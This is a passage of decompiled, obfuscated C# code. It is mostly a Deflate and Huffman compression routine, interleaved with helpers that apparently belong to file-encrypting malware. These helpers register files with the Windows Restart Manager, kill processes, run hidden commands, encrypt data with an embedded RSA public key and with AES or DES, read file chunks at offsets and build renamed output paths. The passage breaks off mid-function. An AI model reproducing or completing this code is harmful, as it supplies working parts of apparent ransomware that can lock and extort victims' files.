		((byte*)ptr)[20] = class30_0.byte_0[*(int*)((byte*)ptr + 4) - 1];
		((byte*)ptr)[21] = class30_0.byte_0[*(int*)((byte*)ptr + 4)];
		if (*(int*)((byte*)ptr + 8) >= 8)
		{
			num >>= 2;
		}
		if (*(int*)ptr > class30_0.int_15)
		{
			*(int*)ptr = class30_0.int_15;
		}
		do
		{
			if (class30_0.byte_0[int_0 + *(int*)((byte*)ptr + 8)] != ((byte*)ptr)[21] || class30_0.byte_0[int_0 + *(int*)((byte*)ptr + 8) - 1] != ((byte*)ptr)[20] || class30_0.byte_0[int_0] != class30_0.byte_0[int_] || class30_0.byte_0[int_0 + 1] != class30_0.byte_0[int_ + 1])
			{
				continue;
			}
			int num2 = int_0 + 2;
			int_ += 2;
			while (class30_0.byte_0[++int_] == class30_0.byte_0[++num2] && class30_0.byte_0[++int_] == class30_0.byte_0[++num2] && class30_0.byte_0[++int_] == class30_0.byte_0[++num2] && class30_0.byte_0[++int_] == class30_0.byte_0[++num2] && class30_0.byte_0[++int_] == class30_0.byte_0[++num2] && class30_0.byte_0[++int_] == class30_0.byte_0[++num2] && class30_0.byte_0[++int_] == class30_0.byte_0[++num2] && class30_0.byte_0[++int_] == class30_0.byte_0[++num2] && int_ < *(int*)((byte*)ptr + 16))
			{
			}
			if (int_ > *(int*)((byte*)ptr + 4))
			{
				class30_0.int_11 = int_0;
				*(int*)((byte*)ptr + 4) = int_;
				*(int*)((byte*)ptr + 8) = int_ - class30_0.int_14;
				if (*(int*)((byte*)ptr + 8) >= *(int*)ptr)
				{
					break;
				}
				((byte*)ptr)[20] = class30_0.byte_0[*(int*)((byte*)ptr + 4) - 1];
				((byte*)ptr)[21] = class30_0.byte_0[*(int*)((byte*)ptr + 4)];
			}
			int_ = class30_0.int_14;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > *(int*)((byte*)ptr + 12) && --num != 0);
		class30_0.int_12 = Math.Min(*(int*)((byte*)ptr + 8), class30_0.int_15);
		return class30_0.int_12 >= 3;
	}

	unsafe static int smethod_35(byte[] byte_0, int int_0, int int_1, Class21.Class22 class22_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		do
		{
			if (class22_0.int_17 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class32.smethod_24(int_0, byte_0, int_1, class22_0.class24_0);
				int_1 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_0 -= *(int*)((byte*)ptr + 4);
				if (int_0 == 0)
				{
					return *(int*)ptr;
				}
			}
		}
		while (Class32.smethod_25(class22_0) || (class22_0.class24_0.int_3 > 0 && class22_0.int_17 != 11));
		return *(int*)ptr;
	}

	static bool smethod_36(Process process_0, bool bool_0 = false)
	{
		if (process_0 != null && !process_0.HasExited)
		{
			process_0.Kill();
			if (bool_0)
			{
				process_0.WaitForExit();
			}
			return true;
		}
		return false;
	}

	[DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
	static extern int RmRegisterResources(uint uint_0, uint uint_1, string[] string_0, uint uint_2, [In] Class1.Struct0[] struct0_0, uint uint_3, string[] string_1);

	unsafe static bool smethod_37(int int_0, int int_1, Class21.Class28 class28_0)
	{
		void* ptr = stackalloc byte[12];
		class28_0.short_0[class28_0.int_9] = (short)int_0;
		byte[] byte_ = class28_0.byte_1;
		*(int*)((byte*)ptr + 8) = class28_0.int_9;
		class28_0.int_9 = *(int*)((byte*)ptr + 8) + 1;
		byte_[*(int*)((byte*)ptr + 8)] = (byte)(int_1 - 3);
		*(int*)ptr = Class32.smethod_68(class28_0, int_1 - 3);
		class28_0.class29_0.short_0[*(int*)ptr]++;
		if (*(int*)ptr >= 265 && *(int*)ptr < 285)
		{
			class28_0.int_10 += (*(int*)ptr - 261) / 4;
		}
		*(int*)((byte*)ptr + 4) = Class32.smethod_40(class28_0, int_0 - 1);
		class28_0.class29_1.short_0[*(int*)((byte*)ptr + 4)]++;
		if (*(int*)((byte*)ptr + 4) >= 4)
		{
			class28_0.int_10 += *(int*)((byte*)ptr + 4) / 2 - 1;
		}
		return class28_0.int_9 >= 16384;
	}

	static short smethod_38(int int_0)
	{
		return (short)((Class21.Class28.byte_0[int_0 & 0xF] << 12) | (Class21.Class28.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class21.Class28.byte_0[(int_0 >> 8) & 0xF] << 4) | Class21.Class28.byte_0[int_0 >> 12]);
	}

	unsafe static bool smethod_39(Class21.Class26 class26_0, Class21.Class23 class23_0)
	{
		void* ptr = stackalloc byte[12];
		while (true)
		{
			*(int*)ptr = class26_0.int_8;
			switch (*(int*)ptr)
			{
			case 5:
			{
				*(int*)((byte*)ptr + 8) = Class21.Class26.int_7[class26_0.int_13];
				int num = Class32.smethod_70(class23_0, *(int*)((byte*)ptr + 8));
				if (num >= 0)
				{
					Class32.smethod_94(class23_0, *(int*)((byte*)ptr + 8));
					num += Class21.Class26.int_6[class26_0.int_13];
					while (num-- > 0)
					{
						byte[] byte_ = class26_0.byte_1;
						*(int*)ptr = class26_0.int_14;
						class26_0.int_14 = *(int*)ptr + 1;
						byte_[*(int*)ptr] = class26_0.byte_2;
					}
					if (class26_0.int_14 == class26_0.int_12)
					{
						return true;
					}
					goto IL_0084;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class32.smethod_33(class26_0.class25_0, class23_0)) & -16) == 0)
				{
					byte[] byte_2 = class26_0.byte_1;
					*(int*)ptr = class26_0.int_14;
					class26_0.int_14 = *(int*)ptr + 1;
					byte_2[*(int*)ptr] = (class26_0.byte_2 = (byte)num2);
					if (class26_0.int_14 == class26_0.int_12)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class26_0.byte_2 = 0;
					}
					class26_0.int_13 = num2 - 16;
					class26_0.int_8 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class26_0.int_14 < class26_0.int_11)
				{
					*(int*)((byte*)ptr + 4) = Class32.smethod_70(class23_0, 3);
					if (*(int*)((byte*)ptr + 4) >= 0)
					{
						Class32.smethod_94(class23_0, 3);
						class26_0.byte_0[Class21.Class26.int_15[class26_0.int_14]] = (byte)(*(uint*)((byte*)ptr + 4));
						class26_0.int_14++;
						continue;
					}
					return false;
				}
				class26_0.class25_0 = new Class21.Class25(class26_0.byte_0);
				class26_0.byte_0 = null;
				class26_0.int_14 = 0;
				class26_0.int_8 = 4;
				goto case 4;
			case 2:
				class26_0.int_11 = Class32.smethod_70(class23_0, 4);
				if (class26_0.int_11 >= 0)
				{
					class26_0.int_11 += 4;
					Class32.smethod_94(class23_0, 4);
					class26_0.byte_0 = new byte[19];
					class26_0.int_14 = 0;
					class26_0.int_8 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class26_0.int_10 = Class32.smethod_70(class23_0, 5);
				if (class26_0.int_10 >= 0)
				{
					class26_0.int_10++;
					Class32.smethod_94(class23_0, 5);
					class26_0.int_12 = class26_0.int_9 + class26_0.int_10;
					class26_0.byte_1 = new byte[class26_0.int_12];
					class26_0.int_8 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class26_0.int_9 = Class32.smethod_70(class23_0, 5);
				if (class26_0.int_9 >= 0)
				{
					class26_0.int_9 += 257;
					Class32.smethod_94(class23_0, 5);
					class26_0.int_8 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_0084:
			class26_0.int_8 = 4;
		}
	}

	static int smethod_40(Class21.Class28 class28_0, int int_0)
	{
		int num = 0;
		while (int_0 >= 4)
		{
			num += 2;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static string smethod_41()
	{
		return WindowsIdentity.GetCurrent().User!.ToString();
	}

	static void smethod_42(Class21.Class23 class23_0)
	{
		class23_0.uint_0 >>= class23_0.int_2 & 7;
		class23_0.int_2 &= -8;
	}

	static string smethod_43(string string_0, string string_1)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		try
		{
			Process process = Process.Start(new ProcessStartInfo(string_0, string_1)
			{
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				StandardOutputEncoding = Encoding.GetEncoding("UTF-8"),
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = false,
				CreateNoWindow = true
			});
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace!.ToString();
		}
	}

	static void smethod_44(Class21.Class28 class28_0, int int_0)
	{
		Class32.smethod_66(class28_0.class29_2);
		Class32.smethod_66(class28_0.class29_0);
		Class32.smethod_66(class28_0.class29_1);
		Class32.smethod_93(class28_0.class31_0, class28_0.class29_0.int_1 - 257, 5);
		Class32.smethod_93(class28_0.class31_0, class28_0.class29_1.int_1 - 1, 5);
		Class32.smethod_93(class28_0.class31_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class32.smethod_93(class28_0.class31_0, (int)class28_0.class29_2.byte_0[Class21.Class28.int_8[i]], 3);
		}
		Class21.Class28.Class29 class29_ = class28_0.class29_0;
		Class21.Class28.Class29 class29_2 = class28_0.class29_2;
		Class32.smethod_8(class29_2, class29_);
		class29_ = class28_0.class29_1;
		class29_2 = class28_0.class29_2;
		Class32.smethod_8(class29_2, class29_);
	}

	static void smethod_45(Class21.Class28.Class29 class29_0, int int_0)
	{
		Class32.smethod_93(class29_0.class28_0.class31_0, class29_0.short_1[int_0] & 0xFFFF, (int)class29_0.byte_0[int_0]);
	}

	static int smethod_46(Class21.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static void smethod_47(byte[] byte_0, short[] short_0, Class21.Class28.Class29 class29_0)
	{
		class29_0.short_1 = short_0;
		class29_0.byte_0 = byte_0;
	}

	static Class21.Class25 smethod_48(Class21.Class26 class26_0)
	{
		byte[] array = new byte[class26_0.int_9];
		Array.Copy(class26_0.byte_1, 0, array, 0, class26_0.int_9);
		return new Class21.Class25(array);
	}

	static void smethod_49(Class21.Class24 class24_0, int int_0, int int_1)
	{
		if ((class24_0.int_3 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class24_0.int_2 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class24_0.int_2 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class24_0.byte_0, num, class24_0.byte_0, class24_0.int_2, int_0);
				class24_0.int_2 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class24_0.byte_0[class24_0.int_2++] = class24_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class32.smethod_75(class24_0, num, int_0, int_1);
		}
	}

	static string smethod_50(string string_0)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(string_0));
	}

	static bool smethod_51()
	{
		return Class8.smethod_0();
	}

	static void smethod_52(Class21.Stream0 stream0_0, int int_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static bool smethod_53(int int_0, Class21.Class28 class28_0)
	{
		class28_0.short_0[class28_0.int_9] = 0;
		class28_0.byte_1[class28_0.int_9++] = (byte)int_0;
		class28_0.class29_0.short_0[int_0]++;
		return class28_0.int_9 >= 16384;
	}

	static string smethod_54(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	unsafe static void smethod_55(Class21.Class28.Class29 class29_0, Class21.Class28.Class29 class29_1)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class29_1.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class29_1.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					class29_0.short_0[*(int*)((byte*)ptr + 16)]++;
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class29_1.int_1 && *(int*)((byte*)ptr + 8) == class29_1.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				class29_0.short_0[*(int*)((byte*)ptr + 8)] += (short)num;
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				class29_0.short_0[16]++;
			}
			else if (num <= 10)
			{
				class29_0.short_0[17]++;
			}
			else
			{
				class29_0.short_0[18]++;
			}
		}
	}

	unsafe static void smethod_56(Class21.Class30 class30_0)
	{
		void* ptr = stackalloc byte[16];
		Array.Copy(class30_0.byte_0, 32768, class30_0.byte_0, 0, 32768);
		class30_0.int_11 -= 32768;
		class30_0.int_14 -= 32768;
		class30_0.int_13 -= 32768;
		*(int*)ptr = 0;
		while (*(int*)ptr < 32768)
		{
			*(int*)((byte*)ptr + 4) = class30_0.short_0[*(int*)ptr] & 0xFFFF;
			class30_0.short_0[*(int*)ptr] = (short)((*(int*)((byte*)ptr + 4) >= 32768) ? (*(int*)((byte*)ptr + 4) - 32768) : 0);
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < 32768)
		{
			*(int*)((byte*)ptr + 12) = class30_0.short_1[*(int*)((byte*)ptr + 8)] & 0xFFFF;
			class30_0.short_1[*(int*)((byte*)ptr + 8)] = (short)((*(int*)((byte*)ptr + 12) >= 32768) ? (*(int*)((byte*)ptr + 12) - 32768) : 0);
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static void smethod_57(int int_0, byte[] byte_0, Class21.Class24 class24_0, int int_1)
	{
		if (class24_0.int_3 > 0)
		{
			throw new InvalidOperationException();
		}
		if (int_0 > 32768)
		{
			int_1 += int_0 - 32768;
			int_0 = 32768;
		}
		Array.Copy(byte_0, int_1, class24_0.byte_0, 0, int_0);
		class24_0.int_2 = int_0 & 0x7FFF;
	}

	unsafe static int smethod_58(Class21.Class23 class23_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (class23_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class23_0.uint_0;
			class23_0.uint_0 >>= 8;
			class23_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			return *(int*)ptr;
		}
		*(int*)((byte*)ptr + 4) = class23_0.int_1 - class23_0.int_0;
		if (int_1 > *(int*)((byte*)ptr + 4))
		{
			int_1 = *(int*)((byte*)ptr + 4);
		}
		Array.Copy(class23_0.byte_0, class23_0.int_0, byte_0, int_0, int_1);
		class23_0.int_0 += int_1;
		if (((uint)(class23_0.int_0 - class23_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			byte[] byte_ = class23_0.byte_0;
			*(int*)((byte*)ptr + 8) = class23_0.int_0;
			class23_0.int_0 = *(int*)((byte*)ptr + 8) + 1;
			class23_0.uint_0 = byte_[*(int*)((byte*)ptr + 8)] & 0xFFu;
			class23_0.int_2 = 8;
		}
		return *(int*)ptr + int_1;
	}

	static int smethod_59(Class21.Class31 class31_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class31_0.int_2 >= 8)
		{
			class31_0.byte_0[class31_0.int_1++] = (byte)class31_0.uint_0;
			class31_0.uint_0 >>= 8;
			class31_0.int_2 -= 8;
		}
		if (int_1 > class31_0.int_1 - class31_0.int_0)
		{
			int_1 = class31_0.int_1 - class31_0.int_0;
			Array.Copy(class31_0.byte_0, class31_0.int_0, byte_0, int_0, int_1);
			class31_0.int_0 = 0;
			class31_0.int_1 = 0;
		}
		else
		{
			Array.Copy(class31_0.byte_0, class31_0.int_0, byte_0, int_0, int_1);
			class31_0.int_0 += int_1;
		}
		return int_1;
	}

	unsafe static void smethod_60(Class21.Class25 class25_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[64];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 16) = byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				array[*(int*)((byte*)ptr + 16)]++;
			}
			(*(int*)((byte*)ptr + 12))++;
		}
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 512;
		*(int*)((byte*)ptr + 20) = 1;
		while (*(int*)((byte*)ptr + 20) <= 15)
		{
			array2[*(int*)((byte*)ptr + 20)] = *(int*)ptr;
			*(int*)ptr += array[*(int*)((byte*)ptr + 20)] << 16 - *(int*)((byte*)ptr + 20);
			if (*(int*)((byte*)ptr + 20) >= 10)
			{
				*(int*)((byte*)ptr + 24) = array2[*(int*)((byte*)ptr + 20)] & 0x1FF80;
				*(int*)((byte*)ptr + 28) = *(int*)ptr & 0x1FF80;
				*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 28) - *(int*)((byte*)ptr + 24) >> 16 - *(int*)((byte*)ptr + 20);
			}
			(*(int*)((byte*)ptr + 20))++;
		}
		class25_0.short_0 = new short[*(int*)((byte*)ptr + 4)];
		*(int*)((byte*)ptr + 8) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)ptr & 0x1FF80;
			*(int*)ptr -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)ptr & 0x1FF80;
			while (*(int*)((byte*)ptr + 40) < *(int*)((byte*)ptr + 36))
			{
				class25_0.short_0[Class32.smethod_38(*(int*)((byte*)ptr + 40))] = (short)((-(*(int*)((byte*)ptr + 8)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 8) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 40) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 44) = 0;
		while (*(int*)((byte*)ptr + 44) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 48) = byte_0[*(int*)((byte*)ptr + 44)];
			if (*(int*)((byte*)ptr + 48) != 0)
			{
				*(int*)ptr = array2[*(int*)((byte*)ptr + 48)];
				*(int*)((byte*)ptr + 52) = Class32.smethod_38(*(int*)ptr);
				if (*(int*)((byte*)ptr + 48) <= 9)
				{
					do
					{
						class25_0.short_0[*(int*)((byte*)ptr + 52)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 56) = class25_0.short_0[*(int*)((byte*)ptr + 52) & 0x1FF];
					*(int*)((byte*)ptr + 60) = 1 << (*(int*)((byte*)ptr + 56) & 0xF);
					*(int*)((byte*)ptr + 56) = -(*(int*)((byte*)ptr + 56) >> 4);
					do
					{
						class25_0.short_0[*(int*)((byte*)ptr + 56) | (*(int*)((byte*)ptr + 52) >> 9)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < *(int*)((byte*)ptr + 60));
				}
				array2[*(int*)((byte*)ptr + 48)] = *(int*)ptr + (1 << 16 - *(int*)((byte*)ptr + 48));
			}
			(*(int*)((byte*)ptr + 44))++;
		}
	}

	static void smethod_61(Class21.Class23 class23_0)
	{
		class23_0.int_2 = 0;
		class23_0.int_1 = 0;
		class23_0.int_0 = 0;
		class23_0.uint_0 = 0u;
	}

	static ICryptoTransform smethod_62(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_0, byte_1) : symmetricAlgorithm.CreateEncryptor(byte_0, byte_1);
	}

	static void smethod_63(Class21.Class27 class27_0, byte[] byte_0)
	{
		Class32.smethod_105(byte_0, class27_0.class30_0);
	}

	unsafe static int smethod_64(Class21.Class27 class27_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[22];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = byte_0.Length;
		*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 4);
		while (true)
		{
			*(int*)((byte*)ptr + 12) = Class32.smethod_59(class27_0.class31_0, byte_0, *(int*)ptr, *(int*)((byte*)ptr + 4));
			*(int*)ptr += *(int*)((byte*)ptr + 12);
			class27_0.long_0 += *(int*)((byte*)ptr + 12);
			*(int*)((byte*)ptr + 4) -= *(int*)((byte*)ptr + 12);
			if (*(int*)((byte*)ptr + 4) == 0 || class27_0.int_6 == 30)
			{
				break;
			}
			Class21.Class30 class30_ = class27_0.class30_0;
			((byte*)ptr)[20] = (((class27_0.int_6 & 4) != 0) ? ((byte)1) : ((byte)0));
			((byte*)ptr)[21] = (((class27_0.int_6 & 8) != 0) ? ((byte)1) : ((byte)0));
			if (Class32.smethod_87(((byte*)ptr)[20] != 0, class30_, ((byte*)ptr)[21] != 0))
			{
				continue;
			}
			if (class27_0.int_6 != 16)
			{
				if (class27_0.int_6 == 20)
				{
					*(int*)((byte*)ptr + 16) = 8 + (-class27_0.class31_0.int_2 & 7);
					while (*(int*)((byte*)ptr + 16) > 0)
					{
						Class32.smethod_93(class27_0.class31_0, 2, 10);
						*(int*)((byte*)ptr + 16) -= 10;
					}
					class27_0.int_6 = 16;
				}
				else if (class27_0.int_6 == 28)
				{
					Class32.smethod_108(class27_0.class31_0);
					class27_0.int_6 = 30;
				}
				continue;
			}
			return *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
		}
		return *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
	}

	static int smethod_65(Class21.Class24 class24_0)
	{
		return class24_0.int_3;
	}

	unsafe static void smethod_66(Class21.Class28.Class29 class29_0)
	{
		void* ptr = stackalloc byte[16];
		int[] array = new int[class29_0.int_3];
		*(int*)ptr = 0;
		class29_0.short_1 = new short[class29_0.short_0.Length];
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class29_0.int_3)
		{
			array[*(int*)((byte*)ptr + 4)] = *(int*)ptr;
			*(int*)ptr += class29_0.int_2[*(int*)((byte*)ptr + 4)] << 15 - *(int*)((byte*)ptr + 4);
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < class29_0.int_1)
		{
			*(int*)((byte*)ptr + 12) = class29_0.byte_0[*(int*)((byte*)ptr + 8)];
			if (*(int*)((byte*)ptr + 12) > 0)
			{
				class29_0.short_1[*(int*)((byte*)ptr + 8)] = Class32.smethod_38(array[*(int*)((byte*)ptr + 12) - 1]);
				array[*(int*)((byte*)ptr + 12) - 1] += 1 << 16 - *(int*)((byte*)ptr + 12);
			}
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static byte[] smethod_67(string string_0)
	{
		using FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
		byte[] array = new byte[Class0.int_1];
		fileStream.Seek(0L, SeekOrigin.Begin);
		fileStream.Read(array, 0, array.Length);
		return array;
	}

	static int smethod_68(Class21.Class28 class28_0, int int_0)
	{
		if (int_0 == 255)
		{
			return 285;
		}
		int num = 257;
		while (int_0 >= 8)
		{
			num += 4;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static byte[] smethod_69(string string_0, long long_0, out int int_0)
	{
		using FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
		byte[] array = new byte[Class0.int_0];
		fileStream.Seek(long_0, SeekOrigin.Begin);
		int_0 = fileStream.Read(array, 0, array.Length);
		return array;
	}

	static int smethod_70(Class21.Class23 class23_0, int int_0)
	{
		if (class23_0.int_2 < int_0)
		{
			if (class23_0.int_0 == class23_0.int_1)
			{
				return -1;
			}
			class23_0.uint_0 |= (uint)(((class23_0.byte_0[class23_0.int_0++] & 0xFF) | ((class23_0.byte_0[class23_0.int_0++] & 0xFF) << 8)) << class23_0.int_2);
			class23_0.int_2 += 16;
		}
		return (int)(class23_0.uint_0 & ((1 << int_0) - 1));
	}

	static string smethod_71(string string_0, string string_1)
	{
		FileInfo fileInfo = new FileInfo(string_0);
		string string_2 = Class32.smethod_7(string_0, fileInfo.Extension + Class2.string_6);
		string string_3 = Class32.smethod_7(string_0, ".manifest.xml");
		return Class32.smethod_19(string_2, string_1, string_0, string_3);
	}

	static byte[] smethod_72(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class32.smethod_102(byte_2, byte_1, byte_0, 2);
	}

	static void smethod_73(out Version version_0, ref bool bool_0, ref Version version_1, ref Enum2 enum2_0, out string string_0, out string string_1)
	{
		enum2_0 = OsInformation.smethod_1();
		version_1 = OsInformation.smethod_2(enum2_0, version_1);
		string_1 = Class32.smethod_9(version_1);
		bool_0 = OsVersionInformation.IsX64;
	}

	static ICryptoTransform smethod_74(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_0, byte_1) : dESCryptoServiceProvider.CreateEncryptor(byte_0, byte_1);
	}

	static void smethod_75(Class21.Class24 class24_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class24_0.byte_0[class24_0.int_2++] = class24_0.byte_0[int_0++];
			class24_0.int_2 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static void smethod_76()
	{
		try
		{
			Class32.smethod_83();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_77(byte[] byte_0, int int_0, Class21.Class23 class23_0, int int_1)
	{
		if (class23_0.int_0 < class23_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class23_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class23_0.int_2);
				class23_0.int_2 += 8;
			}
			class23_0.byte_0 = byte_0;
			class23_0.int_0 = int_0;
			class23_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static bool smethod_78(string string_0)
	{
		bool result = false;
		try
		{
			if (File.Exists(string_0))
			{
				result = true;
				return result;
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	static string smethod_79(Version version_0)
	{
		return OsInformation.smethod_0(version_0);
	}

	static byte[] smethod_80(byte[] byte_0, string string_0)
	{
		byte[] array = null;
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.FromXmlString(string_0);
		return rSACryptoServiceProvider.Encrypt(byte_0, fOAEP: true);
	}

	unsafe static void smethod_81(int int_0, int int_1, bool bool_0, byte[] byte_0, Class21.Class28 class28_0)
	{
		void* ptr = stackalloc byte[24];
		class28_0.class29_0.short_0[256]++;
		Class32.smethod_29(class28_0.class29_0);
		Class32.smethod_29(class28_0.class29_1);
		Class21.Class28.Class29 class29_ = class28_0.class29_0;
		Class21.Class28.Class29 class29_2 = class28_0.class29_2;
		Class32.smethod_55(class29_2, class29_);
		class29_ = class28_0.class29_1;
		class29_2 = class28_0.class29_2;
		Class32.smethod_55(class29_2, class29_);
		Class32.smethod_29(class28_0.class29_2);
		*(int*)ptr = 4;
		*(int*)((byte*)ptr + 12) = 18;
		while (*(int*)((byte*)ptr + 12) > *(int*)ptr)
		{
			if (class28_0.class29_2.byte_0[Class21.Class28.int_8[*(int*)((byte*)ptr + 12)]] > 0)
			{
				*(int*)ptr = *(int*)((byte*)ptr + 12) + 1;
			}
			(*(int*)((byte*)ptr + 12))--;
		}
		*(int*)((byte*)ptr + 4) = 14 + *(int*)ptr * 3 + Class32.smethod_101(class28_0.class29_2) + Class32.smethod_101(class28_0.class29_0) + Class32.smethod_101(class28_0.class29_1) + class28_0.int_10;
		*(int*)((byte*)ptr + 8) = class28_0.int_10;
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < 286)
		{
			*(int*)((byte*)ptr + 8) += class28_0.class29_0.short_0[*(int*)((byte*)ptr + 16)] * Class21.Class28.byte_2[*(int*)((byte*)ptr + 16)];
			(*(int*)((byte*)ptr + 16))++;
		}
		*(int*)((byte*)ptr + 20) = 0;
		while (*(int*)((byte*)ptr + 20) < 30)
		{
			*(int*)((byte*)ptr + 8) += class28_0.class29_1.short_0[*(int*)((byte*)ptr + 20)] * Class21.Class28.byte_3[*(int*)((byte*)ptr + 20)];
			(*(int*)((byte*)ptr + 20))++;
		}
		if (*(int*)((byte*)ptr + 4) >= *(int*)((byte*)ptr + 8))
		{
